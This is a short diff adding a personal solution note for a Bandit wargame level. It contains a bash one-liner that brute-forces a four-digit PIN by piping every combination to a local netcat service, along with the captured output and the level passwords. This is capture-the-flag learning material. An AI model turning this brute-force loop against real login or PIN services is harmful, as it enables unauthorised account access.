@@ -1,0 +1,18 @@
+*my solution:
+	the whole trick is writing a script that keeps sending the password + different comb of 4 digits
+	to the nc connection/server without cutting the connection till we get the password
+		#!/bin/bash
+
+		for i in {0000..9999} ; do  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" ; done | nc localhost 30002 | grep -v Wrong > password
+
+	and when we cat password we get the following:
+
+		I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+		Correct!
+		The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+		Exiting.
+
+*password for level 25:
+	uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
